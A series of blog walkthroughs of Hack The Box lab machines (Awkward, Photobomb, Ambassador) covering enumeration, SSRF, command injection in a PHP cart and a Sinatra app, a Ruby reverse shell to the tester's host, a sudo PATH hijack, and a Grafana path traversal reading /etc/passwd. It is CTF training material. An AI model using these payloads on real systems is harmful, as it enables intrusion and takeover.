[{"categories":null,"content":"Introduction A challenging machine offering a VueJS app backed by an Express API. There’s also a separate PHP web store app to exploit for privilege escalation and gaining root access on the machine. This was the next medium machine on my list to tick off in my quest to progress to more difficult boxes and gain further experience. As you’ll see, I had some fun with enumerating things, and my notes reflect this. What’s missing is the little rabbit holes I went down, and I usually leave these out unless they provide further clues / bread crumbs. My write ups are already quite lengthy, and I don’t want to bore people.. too much! Outside of some fiddly enumeration, this machine involves cookie forgery, server side request forgery, a local file inclusion attack on an API – which we use for further enumeration, a little forensics on user files to gain a foothold. With a foothold, things become a little clearer and we find a partially developed PHP web store we can view the source for and find a command injection vulnerability triggered when removing items from our cart. This gives us www-data access on the machine, and by running pspy, we see a recurring cron job running as root we are able to exploit by command injecting into the mail command. ","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:1:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Enumeration As always, let’s start with an nmap scan: $nmap -sC -sV -oA nmap/initial 10.10.11.185 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-30 19:25 AEDT Nmap scan report for 10.10.11.185 Host is up (0.022s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA) |_ 256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html). |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds After adding the hat-valley.htb redirect to /etc/hosts and navigating to http://hat-valley.htb/ - we are greeted with: There is a form further down for submitting your contact details and a message, but this isn’t active – it basically seems like the site is just static content. The favicon and javascript bundle at /js/app.js indicates this is a Vue.js app. Let’s enumerate paths in gobuster with Parrot’s big.txt wordlist: $gobuster dir -u http://hat-valley.htb -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://hat-valley.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/30 19:31:26 Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 173] [--\u003e /css/] /favicon.ico (Status: 200) [Size: 4286] /js (Status: 301) [Size: 171] [--\u003e /js/] /secci� (Status: 500) [Size: 1704] /static (Status: 301) [Size: 179] [--\u003e /static/] =============================================================== 2023/01/30 19:32:31 Finished =============================================================== The request above with unprintable character is a bit strange, and gives a 500 error – which could be something to investigate – does the web server barf on certain characters? In Firefox developer tools when loading the page, I notice SockJs requests to http://localhost:8080/sockjs-node/info?t=1675067935305 which obviously fail. /js/app.js also references this as the webpack-dev-server: /***/ (function(module, exports, __webpack_require__) { __webpack_require__(/*! /var/www/hat-valley.htb/node_modules/webpack/hot/dev-server.js */\"./node_modules/webpack/hot/dev-server.js\"); __webpack_require__(/*! /var/www/hat-valley.htb/node_modules/webpack-dev-server/client/index.js?http://localhost:8080\u0026sockPath=/sockjs-node */\"./node_modules/webpack-dev-server/client/index.js?http://localhost:8080\u0026sockPath=/sockjs-node\"); module.exports = __webpack_require__(/*! ./src/main.js */\"./src/main.js\"); Browsing to http://hat-valley.htb/sockjs-node shows me I can access the web socket: I searched around and played with websocat to see if I could somehow initiate a websocket, but didn’t have any luck. What we can gather is that the Vue.js app is likely running on webpack-dev-server, and contains symbols and other useful information showing us the relative paths of files for the application. So, let’s assume we’re looking at a work in progress web app. Browsing through /js/app.js again, I found references to ./src/Dashboard.vue and ./src/HR.vue /***/ \"./src/Dashboard.vue\": /*!***************************!*\\ !*** ./src/Dashboard.vue ***! \\***************************/ /*! exports provided: default */ /***/ (function(module, __webpack_exports__, __webpack_require__) { /***/ \"./src/H","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:2:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Foothold Let’s try and log in with admin / foobar, and intercept the request in Burp Suite: POST /api/login HTTP/1.1 Host: hat-valley.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://hat-valley.htb/hr Content-Type: application/json Content-Length: 40 Origin: http://hat-valley.htb DNT: 1 Connection: close Cookie: token=guest Pragma: no-cache Cache-Control: no-cache {\"username\":\"admin\",\"password\":\"foobar\"} I attempted a basic login bypass with the following payload substituted into the above: { \"username\": { \"$ne\": null }, \"password\": { \"$ne\": null } } And received the following response from the web server. Not the response I was hoping for, but nonetheless, stack traces are useful in reconnaissance for seeing what framework, libraries, paths, etc are being used. TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received an instance of Object\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Function.from (buffer.js:330:9)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at new Buffer (buffer.js:286:17)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at /var/www/hat-valley.htb/server/server.js:30:76\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)\u003cbr\u003e \u0026nbsp; \u0026nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15\u003cbr\u003e \u0026nbsp; \u0026nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12) I tried a few Node and Mongo bypass techniques, and tried setting the token=admin in the Cookie header of the request. When changing this in my browser and refreshing the page (without actually submitting to the login api), I was presented with a dashboard: I notice a list of URLs in dev tools, and if I filter on XHR, I see: The store status URL is http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22, which gives me a 200 okay with no response: $curl -v \"http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22\" * Trying 10.10.11.185:80... * Connected to hat-valley.htb (10.10.11.185) port 80 (#0) \u003e GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1 \u003e Host: hat-valley.htb \u003e User-Agent: curl/7.87.0 \u003e Accept: */* \u003e * Mark bundle as not supporting multiuse \u003c HTTP/1.1 200 OK \u003c Server: nginx/1.18.0 (Ubuntu) \u003c Date: Mon, 30 Jan 2023 10:38:06 GMT \u003c Content-Length: 0 \u003c Connection: keep-alive \u003c x-powered-by: Express \u003c access-control-allow-origin: * \u003c * Connection #0 to host hat-valley.htb left intact Changing the url query param in the above to point at my own machine, while running a basic python HTTP server locally, I see the app does indeed hit my web server: $sudo python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.185 - - [30/Jan/2023 21:41:48] \"GET / HTTP/1.1\" 200 - The web server also serves up the index.html here (that’s an empty iframe attempting to unsuccessfully load /etc/passwd): Browsing to http://store.hat-valley.htb/ from my own machine, I get a login prompt I thought perhaps when retrieving the URL in the query param, maybe the server sets basic auth headers – so I tried listening on netcat and going to http://hat-valley.htb/api/store-status?url=%22http://10.10.14.17%22, hoping to capture some headers: $sudo nc -lvnp 80 listening on [any] 80 ... connect to [10.10.14.17] from (UNKNOWN) [10.10.11.185] ","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:3:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Privilege Escalation Looking at the output of ps auxfe, the main thing that stands out is nginx running as root, with two worker processes running as www-data: root 1370 0.0 0.0 55196 1764 ? Ss Feb03 0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on; www-data 1372 0.1 0.1 56468 7120 ? S Feb03 2:04 \\_ nginx: worker process www-data 1373 0.0 0.1 56344 6720 ? S Feb03 1:05 \\_ nginx: worker process As user bean, I cannot run anything as sudo. I found the following user/hash for HTTP basic auth in nginx. Initial attempts to brute force failed here: bean@awkward:/etc/nginx/conf.d$ cat .htpasswd admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 Browsing to http://store.hat-valley.htb/, I tried admin / 014mrbeanrules!#P - which works: It’s here I started looking for dynamic behaviour. And while we can’t check out, we can add items to cart, and then remove them once in the cart: Adding item to cart: POST /cart_actions.php HTTP/1.1 Host: store.hat-valley.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://store.hat-valley.htb/shop.php Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 46 Origin: http://store.hat-valley.htb DNT: 1 Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A= Connection: close item=1\u0026user=59ab-bdec-f4c-c29c\u0026action=add_item We also have access to the server PHP in /var/www/store and can see cart_actions.php to ascertain the behaviour and find any vulnerabilities: bean@awkward:/var/www/store$ cat cart_actions.php \u003c?php $STORE_HOME = \"/var/www/store/\"; //check for valid hat valley store item function checkValidItem($filename) { if(file_exists($filename)) { $first_line = file($filename)[0]; if(strpos($first_line, \"***Hat Valley\") !== FALSE) { return true; } } return false; } //add to cart if ($_SERVER['REQUEST_METHOD'] === 'POST' \u0026\u0026 $_POST['action'] === 'add_item' \u0026\u0026 $_POST['item'] \u0026\u0026 $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"\u0026\",\"|\",\"\u003e\",\"\u003c\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}product-details/{$item_id}.txt\")) { if(!file_exists(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"echo '***Hat Valley Cart***' \u003e {$STORE_HOME}cart/{$user_id}\"); } system(\"head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 \u003e\u003e {$STORE_HOME}cart/{$user_id}\"); echo \"Item added successfully!\"; } else { echo \"Invalid item\"; } exit; } //delete from cart if ($_SERVER['REQUEST_METHOD'] === 'POST' \u0026\u0026 $_POST['action'] === 'delete_item' \u0026\u0026 $_POST['item'] \u0026\u0026 $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"\u0026\",\"|\",\"\u003e\",\"\u003c\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\"); echo \"Item removed from cart\"; } else { echo \"Invalid item\"; } exit; } //fetch from cart if ($_SERVER['REQUEST_METHOD'] === 'GET' \u0026\u0026 $_GET['action'] === 'fetch_items' \u0026\u0026 $_GET['user']) { $html = \"\"; $dir = scandir(\"{$STORE_HOME}cart\"); $files = array_slice($dir, 2); foreach($files as $file) { $user_id = substr($file, -18); if($user_id === $_GET['user'] \u0026\u0026 checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { $product_file = fopen(\"{$STORE_HOME}cart/{$file}\", \"r\"); $details = array(); while (($line = fgets($product_file)) !== false) { if(str_re","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:4:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Conclusion This one was quite time consuming and frustrating. I stumbled on the awk LFI and sed command injection. I have to remind myself when doing any kind of injection to always be mindful of the string I’m passing, and if possible, aim for it to be syntactically valid once injected – otherwise the shelled out command may fail and we miss out on LFI or command injection. It’s easy to see something, get caught up in the excitement of it all and throw variations at it without carefully crafting a payload and considering whether or not commands are likely to error before we get what we need. Brute forcing a weak JWT signing key was new to me, and the SSRF for the url param initially seemed obvious, but I was blocked for a little while before deciding to try fuzzing ports. Once again, I needed to remind myself to not just blindly enumerate and fuzz, but look at the broader context and story – which in this case, involved reminding myself that this was a development server running webpack dev server, and likely not deployed on production-like ports (80, 8080, etc). I also spent way too much time trying to decompile the webpack bundle VueJS site (not shown in my notes above), hoping to get cleaner JavaScript for the purposes of finding available routes. After trying a few tools unsuccessfully, in the end I just parsed the file manually (not fun). Overall a fun machine though, even if it involved a couple of days on and off with regular breaks to step away from the frustration of hitting a brick wall multiple times. ","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:5:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Introduction An easy rated machine, and one of my first on HTB that was recently retired. This box was pwned before I started using MarkText and adding in screenshots to my markdown notes, so I’ve only captured STDOUT here, and the entire write up is boring plain text.. sorry. As always, I use Parrot OS Security Edition in a VirtualBox VM, with the OpenVPN client to connect to the HackTheBox VPN. ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:1:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Enumeration Nmap -sC and -sV shows 22 (ssh) and http (80) open. Navigating to http://10.10.11.182/ redirects to http://photobomb.htb. After adding this domain to /etc/hosts, we see a landing page for Photobomb franchise, with a link to http://photobomb.htb/printer – which presents a basic auth dialog. Again, no screenshots, so you will need to use your imagination or just trust me. Let’s start up gobuster in the background while poking around: gobuster dir -u http://photobomb.htb -w /usr/share/dirb/wordlists/common.txt This only returns a favicon and /printer plus /printers, both of which require a user/pass, but if I run gobuster with the /usr/share/dirb/wordlists/big.txt wordlist, I notice: =============================================================== 2022/12/25 13:06:09 Starting gobuster in directory enumeration mode =============================================================== /[ (Status: 400) [Size: 273] /] (Status: 400) [Size: 273] /favicon.ico (Status: 200) [Size: 10990] /plain] (Status: 400) [Size: 278] /printer (Status: 401) [Size: 188] /printer-friendly (Status: 401) [Size: 188] /printerfriendly (Status: 401) [Size: 188] /printer_friendly (Status: 401) [Size: 188] /printers (Status: 401) [Size: 188] /quote] (Status: 400) [Size: 278] Manually checking some of the above: Bad Request bad URI `/quote]'. WEBrick/1.6.0 (Ruby/2.7.0/2019-12-25) at photobomb:4567 So maybe I should look at WEBrick vulns.. but should quickly look at the rest of the site before going deep into a rabbit hole and never returning. I found the following javascript http://photobomb.htb/photobomb.js, which is requested when visiting the home page. I basically just leave the Firefox developer tools open and see what interesting looking requests are made, but intercepting via Burp Suite and looking at the Site map is also a good option here – especially as the number of files, directories and general structure of the site become larger and more complex. Burp suite will build up a better picture of what the site looks like over time as you navigate around, fire off requests, etc. Anyway, the javascript file in question contains: function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer'); } } window.onload = init; Confirmed I am able to log in to http://pH0t0:b0Mb!@photobomb.htb/printer , which gives me a gallery of JPEG thumbnails along with a big red DOWNLOAD PHOTO TO PRINT button, and a drop-down to select the file format. Burp suite captures the following when intercepting POST requests to download an image in a selected file format via the UI: POST /printer HTTP/1.1 Host: photobomb.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://photobomb.htb/printer Content-Type: application/x-www-form-urlencoded Content-Length: 79 Origin: http://photobomb.htb DNT: 1 Authorization: Basic cEgwdDA6YjBNYiE= Connection: close Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg\u0026filetype=jpg\u0026dimensions=3000x2000 After logging in, I can also hit the /printers endpoint I found earlier, which indicates it’s a Sinatra app: Sinatra doesn’t know this ditty. Try this: get '/printers' do \"Hello World\" end ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:2:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Foothold I initially tried to use commix for command injection, but it kept erroring out. I then tried command injection into the photo param without any success. But then I was able to confirm command injection by sending the following payload to /printer: photo=voicu-apostol-MWER49YaD-M-unsplash.jpg\u0026filetype=jpg;sleep 15\u0026dimensions=30x20 So, we basically escape the file type with a semi-colon ;, no need for quotes, double-quotes etc. I confirmed the endpoint appeared to become unresponsive for ~15 seconds as expected. I had issues with typical bash reverse shells, and assumed injecting into the file type was working as the application maybe (?) shells out to bash to run imagemagick or similar in order to convert the image format on the fly, but I was able to use a URL encoded ruby shell from revshells.com: ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=\u003eTCPSocket.new(\"10.10.14.3\",6969))' When injected, by setting Burp Suite to automagically HTML encode my payload, we end up sending the following in the body of the POST request: photo=voicu-apostol-MWER49YaD-M-unsplash.jpg\u0026filetype=jpg;ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.3%22%2C6969%29%29%27\u0026dimensions=30x20 I confirmed I now had a reverse shell: $nc -lvnp 6969 listening on [any] 6969 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.11.182] 50358 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' wizard@photobomb:~/photobomb$ id id uid=1000(wizard) gid=1000(wizard) groups=1000(wizard) wizard@photobomb:~/photobomb$ find / -name 'user.txt' 2\u003e /dev/null find / -name 'user.txt' 2\u003e /dev/null /home/wizard/user.txt wizard@photobomb:~/photobomb$ cat /home/wizard/user.txt cat /home/wizard/user.txt 0afc4ac78d0ff030a8ee3a05821cabf1 So I have the user flag, taken from wizard’s account! ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:3:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Privilege Escalation Now on to privilege escalation. First, let’s try the low hanging fruit: wizard@photobomb:~/photobomb$ sudo -l sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh So we can run /opt/cleanup.sh.. Looking at this script: wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] \u0026\u0026 ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log \u003e log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name '*.jpg' -exec chown root:root {} \\; The commands are absolute paths except for find. I tried copying /bin/bash to /tmp/find, and running the script while preserving my environment with the -E flag, which disables the env_reset option: PATH=\"/tmp:$PATH\" sudo -E /opt/cleanup.sh So, when the shell attempts to run find, it first checks the /tmp directory, and instead would execute my copy of bash. However, this wasn’t working, and after a few minutes of digging through the sudo man page I noticed the env_reset in sudo -l output will reset the path, however also noticed that SETENV is enabled. So, I was able to pick up my fake find executable with a plain old: wizard@photobomb:~/photobomb$ sudo PATH=\"/tmp:$PATH\" /opt/cleanup.sh root@photobomb:/home/wizard/photobomb# id uid=0(root) gid=0(root) groups=0(root) root@photobomb:/home/wizard/photobomb# cat /root/root.txt adc699daf52cc1ba2c0d95e5cc85f007 So the /opt/cleanup.sh script runs as root, and locates the find command in /tmp, which is actually a copy of bash – giving us a root shell. Machine completed! https://www.hackthebox.com/achievement/machine/329250/500 ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:4:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Conclusion Quite straight forward with basic web enumeration – a javascript file with hardcoded basic auth creds, leading into a basic web app that displays a photo gallery. Looking at web requests, we can see a param for filetype in the form data which we can inject into after failing to inject into filename. I struggled to get a basic bash reverse shell working, but knowing the app is a Ruby-based Sinatra app, we can inject a Ruby reverse shell that calls out to sh and pipes the output to a TCP socket in order to gain foothold. From here, we can take advantage of a script we can run as sudo by clobbering the expected find executable’s location in PATH. While env_reset is enabled which causes commands to be executed with a minimal environment, the SETENV option is set, which allows us to prefix a directory to PATH – this directory is enumerated first, finding and executing our renamed bash command as find – giving us a root shell. Looking forward to posting the next one! ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:5:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Intro This was my first medium difficulty box. I noticed it was the highest rated and due to be retired in 2 days – so I decided to tackle this machine in order to quickly release a walkthrough (content creation! clicks! views!) and practice my note taking skills. While I enjoy being in ’the zone’, it is well worthwhile breaking momentarily to take comprehensive notes that can be weaved into a cohesive narrative – if only so I can retrace my steps and help with future CTF challenges. I’m guessing this may have been on the easier side of Medium difficulty, as I went from an nmap scan to root in a little under two hours. Enumeration, exploitation and privilege escalation were fairly straight forward – with privesc being a little less obvious in places. ","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:1:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Enumeration Initial nmap scan: $nmap -sC -sV -o nmap/initial 10.10.11.183 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 20:07 AEDT Nmap scan report for 10.10.11.183 Host is up (0.022s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA) |_ 256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Ambassador Development Server |_http-generator: Hugo 0.94.2 |_http-server-header: Apache/2.4.41 (Ubuntu) 3000/tcp open ppp? | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Thu, 26 Jan 2023 09:07:55 GMT | Content-Length: 29 | href=\"/login\"\u003eFound\u003c/a\u003e. | GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Thu, 26 Jan 2023 09:07:24 GMT | Content-Length: 29 | href=\"/login\"\u003eFound\u003c/a\u003e. | HTTPOptions: | HTTP/1.0 302 Found | Cache-Control: no-cache | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Thu, 26 Jan 2023 09:07:30 GMT |_ Content-Length: 0 3306/tcp open mysql MySQL 8.0.30-0ubuntu0.20.04.2 |_sslv2: ERROR: Script execution failed (use -d to debug) | mysql-info: | Protocol: 10 | Version: 8.0.30-0ubuntu0.20.04.2 | Thread ID: 22 | Capabilities flags: 65535 | Some Capabilities: Support41Auth, FoundRows, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, SupportsTransactions, LongPassword, Speaks41ProtocolOld, InteractiveClient, ConnectWithDatabase, SupportsCompression, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults | Status: Autocommit | Salt: edl\\x1CrF\\KY\\x06\u0026D?WD\\x12[FEj |_ Auth Plugin Name: caching_sha2_password |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3000-TCP:V=7.92%I=7%D=1/26%Time=63D242CD%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\")%r(GetRequest,174,\"HTTP/1\\.0\\x20302\\x20Found\\r\\nCache-Contro SF:l:\\x20no-cache\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nExpir SF🇪🇸\\x20-1\\r\\nLocation:\\x20/login\\r\\nPragma:\\x20no-cache\\r\\nSet-Cookie:\\ SF:x20redirect_to=%2F;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Conten SF:t-Type-Options:\\x20nosniff\\r\\nX-Frame-Options:\\x20deny\\r\\nX-Xss-Protect SF:ion:\\x201;\\x20mode=block\\r\\nDate:\\x20Thu,\\x2026\\x20Jan\\x202023\\x2009:07 SF::24\\x20GMT\\r\\nContent-Length:\\x2029\\r\\n\\r\\n\u003ca\\x20href=\\\"/login\\\"\u003eFound\u003c SF:/a\u003e\\.\\n\\n\")%r(Help,67,\"HTTP/","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:2:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Foothold The login page for Grafana shows v8.2.0, and after a very quick search, I discover GitHub - jas502n/Grafana-CVE-2021-43798: Grafana Unauthorized arbitrary file reading vulnerability Now, copying the GET /login HTTP request for the page into Burp Suite’s repeater, and trying the very first URL for path traversal to see if we can traverse back to the root of the file system, and read /etc/passwd: GET /public/plugins/alertGroups/../../../../../../../../etc/passwd HTTP/1.1 Host: 10.10.11.183:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: redirect_to=%2Fpublic%2Fplugins%2Falertlist%2F Upgrade-Insecure-Requests: 1 we are successful - here’s the response showing /etc/passwd: HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: no-cache Content-Length: 1983 Content-Type: text/plain; charset=utf-8 Expires: -1 Last-Modified: Mon, 14 Mar 2022 02:56:37 GMT Pragma: no-cache X-Content-Type-Options: nosniff X-Frame-Options: deny X-Xss-Protection: 1; mode=block Date: Thu, 26 Jan 2023 